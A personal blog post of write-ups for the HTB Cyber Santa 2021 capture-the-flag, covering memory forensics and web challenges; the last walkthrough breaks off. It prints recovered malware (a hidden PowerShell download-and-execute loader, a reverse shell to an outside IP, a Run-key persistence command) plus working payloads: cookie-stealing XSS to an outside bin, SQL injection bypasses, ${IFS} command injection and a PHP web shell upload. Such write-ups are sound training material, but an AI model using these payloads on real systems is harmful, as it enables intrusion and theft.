---
title: "HTB Cyber Santa CTF 2021"
categories: [Writeups]
layout: post 
---

# HTB Cyber Santa CTF 2021 Writeups

## Solo Placing: #300 / 7996

![](/assets/img/writeups/CyberSanta2021/certificate.jpg)

## Categories
* ### Forensics
    * #### [Honeypot](#challenge-honeypot) * 
    * #### [Persist](#challenge-persist) * 
* ### Web
    * #### [Toy Workshop](#challenge-toy-workshop)
    * #### [Toy Management](#challenge-toy-management)
    * #### [Gadget Santa](#challenge-gadget-santa)
    * #### [Elf Directory](#challenge-elf-directory)
    * #### [Naughty or Nice](#challenge-naughty-or-nice) *

#### * = Recommended Readings

-------------------------------------------------------------------------------

### Challenge: Honeypot
### Category: Forensics

## Description:

![](/assets/img/writeups/CyberSanta2021/honeypot%20Writeup.001.png)

## Walkthrough:

Unzipping the provided zip file, we're presented with one file named `honeypot.raw`. As described in the challenge description, this is a memory image of Santa's honeypot and he would like for us to investigate to see if there has been any suspicious traffic.

Great, so since we're dealing with a memory image we can use [Volatility](https://www.volatilityfoundation.org/) to help us analyze it. I prefer to use Volatility 2 simply because I find the commands easier to remember and there are a few commands that aren't in Volatility 3; I do have both installed though just in case. I also like to reference this [Volatility Cheatsheet](https://book.hacktricks.xyz/forensics/basic-forensic-methodology/memory-dump-analysis/volatility-examples) in case I forget a command or need ideas on which information I should target next.

#### Note: For the sake of simplicity, I will be referring to the Volatility command as `vol`.

After running the initial `imageinfo` command to get the profile, I generally like to get as much information about the system as possible. This includes browser history:

```bash
$ vol --file=honeypot.raw --profile=Win7SP1x86_23418 iehistory
Volatility Foundation Volatility Framework 2.6
**************************************************
Process: 3344 iexplore.exe
Cache type "DEST" at 0x5636819
Last modified: 2021-11-25 11:13:50 UTC+0000
Last accessed: 2021-11-25 19:13:52 UTC+0000
URL: Santa@https://windowsliveupdater.com/christmas_update.hta
```

It looks like someone accessed `christmas_update.hta` as the Santa user. HTML Application (HTA) files consist of HTML, Dynamic HTML, and one or more scripting languages supported by Internet Explorer, such as VBScript or JScript. It is not uncommon for these type of files to be malicious (see: [https://attack.mitre.org/techniques/T1218/005/](https://attack.mitre.org/techniques/T1218/005/)).

Let's do a `filescan` and see if we can extract this file for ourselves:

```bash
$ vol --file=honeypot.raw --profile=Win7SP1x86_23418 filescan > filescan.log
```

```bash
$ grep christmas_update filescan.log
0x000000003f4d4348      2      0 -W-rwd \Device\HarddiskVolume1\Users\Santa\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.IE5\M3FMRSOD\christmas_update[1].hta
```

```bash
$ vol --file=honeypot.raw --profile=Win7SP1x86_23418 dumpfiles -n --dump-dir=. -Q 0x000000003f4d4348
```

And here is the output of that file:

```html
<html>
<head>
<HTA:APPLICATION id="Microsoft" applicationName="Christmas update"/>
<script>
var sh = new ActiveXObject("WScript.Shell");
sh.run('powershell.exe /window hidden /e aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHcAaQBuAGQAbwB3AHMAbABpAHYAZQB1AHAAZABhAHQAZQByAC4AYwBvAG0ALwB1AHAAZABhAHQAZQAuAHAAcwAxACcAKQApAA==');
window.close();
</script>
</html>
```

Definitely looks suspicious. It seems to be running a Base64 encoded Powershell command in a hidden window. Decoding the Base64 we get this:

```powershell
iex ((new-object net.webclient).downloadstring('https://windowsliveupdater.com/update.ps1'))
```

Here we can see that the script downloads a Powershell script, `update.ps1`, from the same URL we saw before and then it automatically executes this script with [IEX](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) 

As described in the challenge description, we're looking for three pieces of information to get the flag:
> 1. Find the full URL used to download the malware
> 2. Find the malicious process ID
> 3. Find the attacker's IP

We've already identified the URL to be `https://windowsliveupdater.com/christmas_update.hta`, so next we need to find the malicious process ID (PID). Since we know the script is executing from the command line, we can use `cmdline` in Volatility to quickly identify the PID:

```bash
$ vol --file=honeypot.raw --profile=Win7SP1x86_23418 cmdline
[..snip..]
************************************************************************
powershell.exe pid:   2700
Command line : "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" /window hidden 
/e aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHcAaQBuAGQAbwB3AHMAbABpAHYAZQB1AHAAZABhAHQAZQByAC4AYwBvAG0ALwB1AHAAZABhAHQAZQAuAHAAcwAxACcAKQApAA==
************************************************************************
[..snip..]
```

So `2700` is the PID. Now we just need to find the attacker's IP address. We can use the `netscan` command to display active connections, listening ports, etc:

```bash
$ vol --file=honeypot.raw --profile=Win7SP1x86_23418 netscan
Volatility Foundation Volatility Framework 2.6
Offset(P)          Proto    Local Address                  Foreign Address      State            Pid      Owner          Created
0x23d04218         TCPv4    0.0.0.0:49155                  0.0.0.0:0            LISTENING        400      services.exe   
0x23d04218         TCPv6    :::49155                       :::0                 LISTENING        400      services.exe   
0x2554b460         TCPv4    10.0.2.15:49226                93.184.220.29:80     ESTABLISHED      -1
0x261e9d30         TCPv4    10.0.2.15:49228                172.67.177.22:443    ESTABLISHED      -1
0x3e22f008         UDPv4    0.0.0.0:0                      *:*                                   2080     svchost.exe    2021-11-25 19:12:23 UTC+0000
0x3e22f008         UDPv6    :::0                           *:*                                   2080     svchost.exe    2021-11-25 19:12:23 UTC+0000
0x3e24c588         UDPv4    0.0.0.0:0                      *:*                                   2080     svchost.exe    2021-11-25 19:12:23 UTC+0000
0x3e281368         UDPv4    10.0.2.15:138                  *:*                                   4        System         2021-11-25 19:12:23 UTC+0000
0x3e2a29b8         UDPv4    0.0.0.0:0                      *:*                                   1084     svchost.exe    2021-11-25 19:12:23 UTC+0000
0x3e2a29b8         UDPv6    :::0                           *:*                                   1084     svchost.exe    2021-11-25 19:12:23 UTC+0000
0x3e2a6448         UDPv4    0.0.0.0:5355                   *:*                                   1084     svchost.exe    2021-11-25 19:12:26 UTC+0000
0x3e354618         UDPv6    fe80::256b:4013:4140:453f:546  *:*                                   744      svchost.exe    2021-11-25 19:12:31 UTC+0000
0x3e3b0c70         UDPv4    0.0.0.0:0                      *:*                                   2700     powershell.exe 2021-11-25 19:13:51 UTC+0000
0x3e5e4f50         UDPv4    0.0.0.0:5355                   *:*                                   1084     svchost.exe    2021-11-25 19:12:26 UTC+0000
0x3e5e4f50         UDPv6    :::5355                        *:*                                   1084     svchost.exe    2021-11-25 19:12:26 UTC+0000
0x3e630008         UDPv4    0.0.0.0:0                      *:*                                   2700     powershell.exe 2021-11-25 19:13:51 UTC+0000
0x3e630008         UDPv6    :::0                           *:*                                   2700     powershell.exe 2021-11-25 19:13:51 UTC+0000
0x3e238300         TCPv4    0.0.0.0:445                    0.0.0.0:0            LISTENING        4        System
0x3e238300         TCPv6    :::445                         :::0                 LISTENING        4        System
0x3e2b5b88         TCPv4    10.0.2.15:139                  0.0.0.0:0            LISTENING        4        System
0x3e5f77a0         TCPv4    0.0.0.0:22                     0.0.0.0:0            LISTENING        1676     sshd.exe       
0x3e619578         TCPv4    0.0.0.0:49152                  0.0.0.0:0            LISTENING        348      wininit.exe    
0x3e619578         TCPv6    :::49152                       :::0                 LISTENING        348      wininit.exe    
0x3e619cc0         TCPv4    0.0.0.0:49152                  0.0.0.0:0            LISTENING        348      wininit.exe    
0x3e630a20         TCPv4    0.0.0.0:49156                  0.0.0.0:0            LISTENING        408      lsass.exe      
0x3e630a20         TCPv6    :::49156                       :::0                 LISTENING        408      lsass.exe      
0x3e648508         TCPv4    0.0.0.0:49153                  0.0.0.0:0            LISTENING        744      svchost.exe    
0x3e648508         TCPv6    :::49153                       :::0                 LISTENING        744      svchost.exe    
0x3e6b92c0         TCPv4    0.0.0.0:135                    0.0.0.0:0            LISTENING        692      svchost.exe    
0x3e6b92c0         TCPv6    :::135                         :::0                 LISTENING        692      svchost.exe    
0x3e6b9910         TCPv4    0.0.0.0:135                    0.0.0.0:0            LISTENING        692      svchost.exe    
0x3e6f0bd8         TCPv4    0.0.0.0:49153                  0.0.0.0:0            LISTENING        744      svchost.exe    
0x3e75f8e0         TCPv4    0.0.0.0:49154                  0.0.0.0:0            LISTENING        888      svchost.exe    
0x3e762a40         TCPv4    0.0.0.0:49155                  0.0.0.0:0            LISTENING        400      services.exe   
0x3e7686e8         TCPv4    0.0.0.0:49154                  0.0.0.0:0            LISTENING        888      svchost.exe    
0x3e7686e8         TCPv6    :::49154                       :::0                 LISTENING        888      svchost.exe    
0x3e2e9cc0         TCPv4    10.0.2.15:49221                212.205.126.106:443  ESTABLISHED      -1
0x3ed036c8         UDPv4    10.0.2.15:137                  *:*                                   4        System         2021-11-25 19:12:23 UTC+0000
0x3e8611f0         TCPv4    0.0.0.0:22                     0.0.0.0:0            LISTENING        1676     sshd.exe
0x3e8611f0         TCPv6    :::22                          :::0                 LISTENING        1676     sshd.exe
0x3e9be828         TCPv4    0.0.0.0:49156                  0.0.0.0:0            LISTENING        408      lsass.exe
0x3ee98d80         TCPv4    10.0.2.15:49229                147.182.172.189:4444 ESTABLISHED      -1
0x3f1b0df8         TCPv4    10.0.2.15:49216                212.205.126.106:443  ESTABLISHED      -1
0x3f2cff50         UDPv4    0.0.0.0:0                      *:*                                   261576   ??♥            2021-11-25 19:13:04 UTC+0000
0x3f2cff50         UDPv6    :::0                           *:*                                   261576   ??♥            2021-11-25 19:13:04 UTC+0000
0x3f4d7378         UDPv4    0.0.0.0:0                      *:*                                   2700     powershell.exe 2021-11-25 19:13:51 UTC+0000
0x3f4dad28         UDPv4    127.0.0.1:58426                *:*                                   3344     iexplore.exe   2021-11-25 19:13:31 UTC+0000
0x3f520ab8         UDPv4    0.0.0.0:0                      *:*                                   2700     powershell.exe 2021-11-25 19:13:51 UTC+0000
0x3f520ab8         UDPv6    :::0                           *:*                                   2700     powershell.exe 2021-11-25 19:13:51 UTC+0000
0x3f546de8         UDPv4    0.0.0.0:0                      *:*                                   636      VBoxService.ex 2021-11-25 19:14:14 UTC+0000
0x3f225df8         TCPv4    10.0.2.15:49222                212.205.126.106:443  ESTABLISHED      -1
0x3f547008         TCPv4    10.0.2.15:49220                212.205.126.106:443  ESTABLISHED      -1
0x3f561438         TCPv4    10.0.2.15:49215                204.79.197.203:443   ESTABLISHED      -1
0x3f57c438         TCPv4    10.0.2.15:49218                95.100.210.141:443   ESTABLISHED      -1
0x3f58b4c8         TCPv4    10.0.2.15:49217                212.205.126.106:443  ESTABLISHED      -1
0x3f58c748         TCPv4    10.0.2.15:49223                212.205.126.106:443  ESTABLISHED      -1
0x3f58e9d8         TCPv4    10.0.2.15:49225                172.67.177.22:443    ESTABLISHED      -1
0x3f5c6df8         TCPv4    10.0.2.15:49219                95.100.210.141:443   ESTABLISHED      -1
```

Parsing the output I noticed one specific connection that seemed suspicious:

```bash
0x3ee98d80         TCPv4    10.0.2.15:49229                147.182.172.189:4444 ESTABLISHED      -1
```

IP address `147.182.172.189` is connecting to port `4444` which is the default listener port for Metasploit. Presumably the `update.ps1` script that executed contains the IP address used to create the reverse shell connection, so let's dump the Powershell process (PID: `2700`):

```bash
$ vol --file=honeypot.raw --profile=Win7SP1x86_23418 memdump -p 2700 --dump-dir=.
```

And then we can grep for port `4444` or the IP address directly:

```bash
$ strings 2700.dmp | grep 4444
[..snip..]
$client = New-Object System.Net.Sockets.TCPClient('147.182.172.189',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS 
' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
[..snip..]
```

And there's the full reverse shell. Cleaning it up a bit, it looks like this:

```powershell
$client = New-Object System.Net.Sockets.TCPClient('147.182.172.189',4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    ;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```

Essentially the script establishes a connection to `147.182.172.189` (the attacker's IP) on port `4444`. It then continually reads in a maximum of 6,5535 bytes from the attacker which it stores in the `$data` variable. It executes the string in `$data` and stores the output of the command in `$sendback`. Finally, it sends back the output to the attacker in what looks like a fake Powershell prompt (`PS >`).

Awesome, so we have identified all of the pieces for the flag. Now we just need to execute the command that was given to us in the challenge description:

```bash
$ echo -n "https://windowsliveupdater.com/christmas_update.hta_2700_147.182.172.189" | md5sum
969b934d7396d043a50a37b70e1e010a
```

And that's our flag!

### Flag: HTB{969b934d7396d043a50a37b70e1e010a}

-------------------------------------------------------------------------------

### Challenge: Persist
### Category: Forensics

## Description:

![](/assets/img/writeups/CyberSanta2021/persist%20Writeup.001.png)

## Walkthrough:

Unzipping the provided zip file, we're presented with one file named `persist.raw`. As described in the challenge description, this is a memory image of Santa's computer and he would like for us to investigate to why he is experiencing a slow boot time and a suspicious blue window popping up for a split second during startup.

The blue window popping up during start up makes me think of a Powershell window and given the challenge description and challenge name, `Persist`, I immediately thought to check the [Run](https://docs.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys) registry key on Santa's computer. This key specifies programs to run each time a user logs on.

First, we need to identify where the registry hives are in memory. We can do this with the `hivelist` command in Volatility:

```bash
$ vol --file=persist.raw --profile=Win7SP1x86_23418 hivelist
Volatility Foundation Volatility Framework 2.6
Virtual    Physical   Name
---------- ---------- ----
0xa5a289c8 0x04abd9c8 \??\C:\Users\Santa\ntuser.dat
0xa7a73008 0x0fd97008 \??\C:\Users\sshd_server\ntuser.dat
0xa7a7a188 0x17265188 \??\C:\Users\sshd_server\AppData\Local\Microsoft\Windows\UsrClass.dat
0x87a10370 0x280d0370 [no name]
0x87a1c008 0x2815e008 \REGISTRY\MACHINE\SYSTEM
0x87a459c8 0x281299c8 \REGISTRY\MACHINE\HARDWARE
0x88be09c8 0x1f44e9c8 \Device\HarddiskVolume1\Boot\BCD
0x8e6ac008 0x223a4008 \SystemRoot\System32\Config\SOFTWARE
0x962689c8 0x1b4f19c8 \SystemRoot\System32\Config\DEFAULT
0xa16ec9c8 0x26e1c9c8 \SystemRoot\System32\Config\SECURITY
0xa17479c8 0x1dd759c8 \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT
0xa1d09008 0x19088008 \SystemRoot\System32\Config\SAM
0xa1dce9c8 0x313659c8 \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT
0xa21aa008 0x1350a008 \??\C:\Users\IEUser\ntuser.dat
0xa2a0a008 0x001b4008 \??\C:\Users\IEUser\AppData\Local\Microsoft\Windows\UsrClass.dat
0xa5a28008 0x04abd008 \??\C:\Users\Santa\AppData\Local\Microsoft\Windows\UsrClass.dat
```

Let's take a look at the Run key in the `HKEY_CURRENT_USER` hive which is stored in Santa's [ntuser.dat](https://www.howtogeek.com/401365/what-is-the-ntuser.dat-file/) (virtual address `0xa5a289c8`).

```bash
$ vol --file=persist.raw --profile=Win7SP1x86_23418 printkey -o 0xa5a289c8 -K 'Software\Microsoft\Windows\CurrentVersion\Run'
Volatility Foundation Volatility Framework 2.6
Legend: (S) = Stable   (V) = Volatile

----------------------------
Registry: \??\C:\Users\Santa\ntuser.dat
Key name: Run (S)
Last updated: 2021-11-30 22:04:29 UTC+0000

Subkeys:
  (S) cmFuZG9tCg

Values:
REG_SZ        cmFuZG9tCg      : (S) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -enc JABQAGEAdABoACAAPQAgACcAQwA6AFwAUAByAG8AZwByAGEAbQBEAGEAdABhAFwAdwBpAG4AZABvAHcAcwBcAHcAaQBuAC4AZQB4AGUAJwA7AGkAZgAgACgALQBOAE8AVAAoAFQAZQBzAHQALQBQAGEAdABoACAALQBQAGEAdABoACAAJABQAGEAdABoACAALQBQAGEAdABoAFQAeQBwAGUAIABMAGUAYQBmACkAKQB7AFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAkAFAAYQB0AGgAfQBlAGwAcwBlAHsAbQBrAGQAaQByACAAJwBDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXAB3AGkAbgBkAG8AdwBzACcAOwAkAGYAbABhAGcAIAA9ACAAIgBIAFQAQgB7AFQAaAAzAHMAMwBfADMAbAB2ADMAcwBfADQAcgAzAF8AcgAzADQAbABsAHkAXwBtADQAbAAxAGMAMQAwAHUAcwB9ACIAOwBpAGUAeAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAiAGgAdAB0AHAAcwA6AC8ALwB3AGkAbgBkAG8AdwBzAGwAaQB2AGUAdQBwAGQAYQB0AGUAcgAuAGMAbwBtAC8AdwBpAG4ALgBlAHgAZQAiACwAJABQAGEAdABoACkAOwBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAJABQAGEAdABoAH0AJQA=
```

Hm, that looks suspicious. As expected it is a Powershell command running with the [bypass execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2)(`-ep bypass`) and it is encoded in Base64.

So let's Base64 decode it and see what we get:

```powershell
$Path = 'C:\ProgramData\windows\win.exe';
if (-NOT(Test-Path -Path $Path -PathType Leaf)){
    Start-Process $Path}else{mkdir 'C:\ProgramData\windows';
    $flag = "HTB{Th3s3_3lv3s_4r3_r34lly_m4l1c10us}";
    iex (New-Object System.Net.WebClient).DownloadFile("https://windowsliveupdater.com/win.exe",$Path);
    Start-Process $Path
}%
```

It looks like the script checks to see if the `win.exe` file is located at `C:\ProgramData\windows\win.exe`. If it is not, the script will then create the `windows` directory in `C:\ProgramData\` and download the file into that path as well as executing it with `iex`.

But more importantly for us, there's our flag!

```powershell
    $flag = "HTB{Th3s3_3lv3s_4r3_r34lly_m4l1c10us}";
```

### Flag: HTB{Th3s3_3lv3s_4r3_r34lly_m4l1c10us}

-------------------------------------------------------------------------------

### Challenge: Toy Workshop
### Category: Web

## Description:

![](/assets/img/writeups/CyberSanta2021/toy%20workshop%20Writeup.001.png)

## Walkthrough:

Navigating to the provided link, we're presented with a page that looks like this:

![](/assets/img/writeups/CyberSanta2021/toy%20workshop%20Writeup.002.gif)

After messing with the site for a little bit, I realized you could actually click on the elves to see this window:

![](/assets/img/writeups/CyberSanta2021/toy%20workshop%20Writeup.003.png)

If we send a test message like "Hello", we get a message back that says "Your message is delivered successfully!"

Since we're given the source code for the website, let's take a look. `/challenge/routes/index.js` contains the routes of the app and there is two routes that are particularly interesting:

```javascript
router.post('/api/submit', async (req, res) => {

		const { query } = req.body;
		if(query){
			return db.addQuery(query)
				.then(() => {
					bot.readQueries(db);
					res.send(response('Your message is delivered successfully!'));
				});
		}
		return res.status(403).send(response('Please write your query first!'));
});

router.get('/queries', async (req, res, next) => {
	if(req.ip != '127.0.0.1') return res.redirect('/');

	return db.getQueries()
		.then(queries => {
			res.render('queries', { queries });
		})
		.catch(() => res.status(500).send(response('Something went wrong!')));
});
```

So from the `/api/submit` route, we can see that our query (aka our message) to the manager will be added to the database (`db.addQuery(query)`) and then the bot (manager) will read our messages (`bot.readQueries(db)`)

Route `/queries` simply gets all of queries and renders them.

Cool, now let's take a look at `/challenge/bot.js` to get a better idea of how the `bot.readQueries()` function works:

```javascript
const cookies = [{
	'name': 'flag',
	'value': 'HTB{f4k3_fl4g_f0r_t3st1ng}'
}];


const readQueries = async (db) => {
		const browser = await puppeteer.launch(browser_options);
		let context = await browser.createIncognitoBrowserContext();
		let page = await context.newPage();
		await page.goto('http://127.0.0.1:1337/');
		await page.setCookie(...cookies);
		await page.goto('http://127.0.0.1:1337/queries', {
			waitUntil: 'networkidle2'
		});
		await browser.close();
		await db.migrate();
};

module.exports = { readQueries };
```

Here we can see that the flag is located within the bot's cookies, so our goal is to steal the cookie. 

The vulnerability here is that because the website will simply render the queries for the bot user, we can inject JavaScript code into our query to perform a Cross-Site-Scripting (XSS) attack.

Here is a simple XSS payload to steal a users cookie:

```javascript
<script>
var i = new Image();
i.src="https://requestbin.io/1p4fk061?cookie="+document.cookie;
</script>
```

So when the bot user reads our queries, our script will execute making them request our [RequestBin](https://requestbin.io/) link with their cookie appended as a GET parameter allowing us to inspect the request and thus see/steal their cookie.

So let's send our payload:

![](/assets/img/writeups/CyberSanta2021/toy%20workshop%20Writeup.004.png)

Now we can inspect the request and see the flag:

![](/assets/img/writeups/CyberSanta2021/toy%20workshop%20Writeup.005.png)

### Flag: HTB{3v1l_3lv3s_4r3_r1s1ng_up!}

-------------------------------------------------------------------------------

### Challenge: Toy Management
### Category: Web

## Description:

![](/assets/img/writeups/CyberSanta2021/toy%20management%20Writeup.001.png)

## Walkthrough:

Navigating to the provided link, we're presented with a page that looks like this:

![](/assets/img/writeups/CyberSanta2021/toy%20management%20Writeup.002.png)

We can try logging in with default credentials like `admin:admin` but this will not work. We can also try simple SQL injections like `' or 1=1 -- -` and this does actually work in the username field:

![](/assets/img/writeups/CyberSanta2021/toy%20management%20Writeup.003.png)

Unfortunately this logs us in as the `manager` user, but based off the description we need to be logged in as the `admin` user.

Luckily, we're provided the source code for the site so let's take a look. Since we've already confirmed we have SQL injection, let's take a look at `/challenge/database.sql` file:

```sql
--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `id` int NOT NULL,
  `username` varchar(256) NOT NULL,
  `password` varchar(256) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `username`, `password`) VALUES
(1, 'manager', '69bbdcd1f9feab7842f3a1c152062407'),
(2, 'admin', '592c094d5574fb32fe9d4cce27240588');
```

Now we can see why we were logged in as the `manager` user since it is the first entry in the `users` table. 

We can also take a look at the `/challenge/database.js` file to see how the login query works:

```javascript
	async loginUser(user, pass) {
		return new Promise(async (resolve, reject) => {
			let stmt = `SELECT username FROM users WHERE username = '${user}' and password = '${pass}'`;
			this.connection.query(stmt, (err, result) => {
				if(err)
					reject(err)
				try {
					resolve(JSON.parse(JSON.stringify(result)))
				}
				catch (e) {
					reject(e)
				}
			})
		});
	}
```

So we just need to modify our injection slightly to something like: `admin' -- -`

Which will make the SQL query look like the following:

```sql
SELECT username FROM users WHERE username = 'admin' -- -' and password = '${pass}'
```

This logs us in as `admin`, allowing us to see the flag:

![](/assets/img/writeups/CyberSanta2021/toy%20management%20Writeup.004.png)

### Flag: HTB{1nj3cti0n_1s_in3v1t4bl3}

-------------------------------------------------------------------------------

### Challenge: Gadget Santa
### Category: Web

## Description:

![](/assets/img/writeups/CyberSanta2021/gadget%20santa%20Writeup.001.png)

## Walkthrough:

Navigating to the provided URL, we're presented with a page that looks like this:

![](/assets/img/writeups/CyberSanta2021/gadget%20santa%20Writeup.002.png)

There are a few buttons on the left that we can interact with (`?command=list_connections` shown here):

![](/assets/img/writeups/CyberSanta2021/gadget%20santa%20Writeup.003.png)

Based off the output, some of these look like regular Linux commands which makes me think we may able to perform a [command injection](https://owasp.org/www-community/attacks/Command_Injection) attack.

Since we're given source, let's take a look at the code to confirm this suspicion. Let's take a look at `/challenge/models/MonitorModel.php` first:

```php
<?php
class MonitorModel
{   
    public function __construct($command)
    {
        $this->command = $this->sanitize($command);
    }

    public function sanitize($command)
    {   
        $command = preg_replace('/\s+/', '', $command);
        return $command;
    }

    public function getOutput()
    {
        return shell_exec('/santa_mon.sh '.$this->command);
    }
}
```

Parsing the code, we can see that there is a simple sanitization function ran on our command to remove spaces (`$command = preg_replace('/\s+/', '', $command);`) and then our command is simply used in the `shell_exec` function as an argument for `/santa_mon.sh`. This is definitely vulnerable to command injection. We can confirm this by trying this payload:

`?command=list_connections;ls`

![](/assets/img/writeups/CyberSanta2021/gadget%20santa%20Writeup.004.png)

As you can see, not only did the `list_connections` execute, but we were also able to execute a command after, that command being `ls` to list files.

So we have arbitrary code execution, but now we need to find the flag. Looking through the source code long enough, I found a file named `ups_manager.py` that runs a web server on `127.0.0.1:3000` which the aforementioned `santa_mon.sh` script talks to in order to perform the `ups_status` and `restart_ups` commands:

```python
import subprocess, json
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer

def get_json(content):
	return json.dumps(content).encode()

def check_service():
	# Yoinks Anti Christmas elves was here!!! 😈
	if subprocess.getoutput('echo "running" #ssh ups@candyfactory.htb "systemctl show -p SubState --value PowerManager"'):
		return True
	return False

def restart_service():
	# Yoinks Anti Christmas elves was here!!! 😈
	runCmd = subprocess.getoutput('echo "sucessful" #ssh ups@candyfactory.htb "systemctl restart PowerManager.service"')
	return True

def http_server(host_port,content_type="application/json"):
	class CustomHandler(SimpleHTTPRequestHandler):
		def do_GET(self) -> None:
			def resp_ok():
				self.send_response(200)
				self.send_header("Content-type", content_type)
				self.end_headers()
			if self.path == '/':
				resp_ok()
				if check_service():
					self.wfile.write(get_json({'status': 'running'}))
				else:
					self.wfile.write(get_json({'status': 'not running'}))
				return
			elif self.path == '/restart':
				restart_service()
				resp_ok()
				self.wfile.write(get_json({'status': 'service restarted successfully'}))
				return
			elif self.path == '/get_flag':
				resp_ok()
				self.wfile.write(get_json({'status': 'HTB{f4k3_fl4g_f0r_t3st1ng}'}))
				return
			self.send_error(404, '404 not found')
		def log_message(self, format, *args):
			pass
	class _TCPServer(TCPServer):
		allow_reuse_address = True
	httpd = _TCPServer(host_port, CustomHandler)
	httpd.serve_forever()

http_server(('127.0.0.1',3000))
```

As you can see there is also a `/get_flag` endpoint for this web server. Normally we would not be able to access this endpoint since this web server is hosted locally, but because we have remote code execution we can perform a [Server-Side Request Forgery (SSRF)](https://portswigger.net/web-security/ssrf) attack to access this internal endpoint.

All we have to do is craft a payload like this:

`?command=list_connections;curl${IFS}localhost:3000/get_flag`

![](/assets/img/writeups/CyberSanta2021/gadget%20santa%20Writeup.005.png)

The `${IFS}` variable stands for "internal field separator" and can be used to bypass the need for spaces.

### Flag: HTB{54nt4_i5_th3_r34l_r3d_t34m3r}

-------------------------------------------------------------------------------

### Challenge: Elf Directory
### Category: Web

## Description:

![](/assets/img/writeups/CyberSanta2021/elf%20directory%20Writeup.001.png)

## Walkthrough:

Navigating to the provided link, we're presented with a page that looks like this:

![](/assets/img/writeups/CyberSanta2021/elf%20directory%20Writeup.002.jpg)

If we create an account and login, we can see our profile but we cannot edit anything:

![](/assets/img/writeups/CyberSanta2021/elf%20directory%20Writeup.003.jpg)

But there is a session cookie set now:

![](/assets/img/writeups/CyberSanta2021/elf%20directory%20Writeup.004.png)

It looks like the cookie is simply Base64 encoded, so let's decode it:

![](/assets/img/writeups/CyberSanta2021/elf%20directory%20Writeup.005.png)


As you can see, whether we are approved to edit our profile or not is simply set within our cookie. So we can simply edit the cookie to set `approved` to `true`:

![](/assets/img/writeups/CyberSanta2021/elf%20directory%20Writeup.006.png)

Updating our cookie, we can now edit our profile. This includes the ability to upload a profile picture:

![](/assets/img/writeups/CyberSanta2021/elf%20directory%20Writeup.007.jpg)

The first thing I tried was to see if there were any protections against uploading files other than images:

![](/assets/img/writeups/CyberSanta2021/elf%20directory%20Writeup.008.png)

Unfortunately only PNG files are allowed. Or are they? We're not given source code for this challenge, but we can try common restriction bypasses. Let's try changing the extension for a valid image from `.png` to `.png.php`:

![](/assets/img/writeups/CyberSanta2021/elf%20directory%20Writeup.013.jpg)

So that worked, I wonder if we navigate to the image if it will display the image or the raw bytes?:

![](/assets/img/writeups/CyberSanta2021/elf%20directory%20Writeup.009.png)

As you can see, we just see the raw bytes of the image, which means that the website is most likely interpreting this as a `php` script because we changed the extension.

Let's attach a simple php web shell to the bottom of the image:

![](/assets/img/writeups/CyberSanta2021/elf%20directory%20Writeup.010.png)

And now we can execute commands simply by appending `?cmd=[command]` to our image link:

`?cmd=ls /`
![](/assets/img/writeups/CyberSanta2021/elf%20directory%20Writeup.011.png)

There's the flag file! Now let's `cat` it out:

`?cmd=cat /flag_65890d927c37c33.txt`

![](/assets/img/writeups/CyberSanta2021/elf%20directory%20Writeup.012.png)

### Flag: HTB{br4k3_au7hs_g3t_5h3lls} 

-------------------------------------------------------------------------------

### Challenge: Naughty or Nice
### Category: Web

## Description:

![](/assets/img/writeups/CyberSanta2021/naughtynice%20Writeup.001.png)

## Walkthrough:

Navigating to the provided URL, we're presented with a page that looks like this:

![](/assets/img/writeups/CyberSanta2021/naughtynice%20Writeup.002.jpg)

As described in the challenge description, all of the elves are on the naughty list and there's a login link in the bottom right. Clicking the login link, we're presented with a login form as expected:

![](/assets/img/writeups/CyberSanta2021/naughtynice%20Writeup.003.png)

We can create an account and login but we're presented with a page telling us we're not authorized:

![](/assets/img/writeups/CyberSanta2021/naughtynice%20Writeup.004.png)

Doing this does generate a session cookie, however:

![](/assets/img/writeups/CyberSanta2021/naughtynice%20Writeup.005.png)

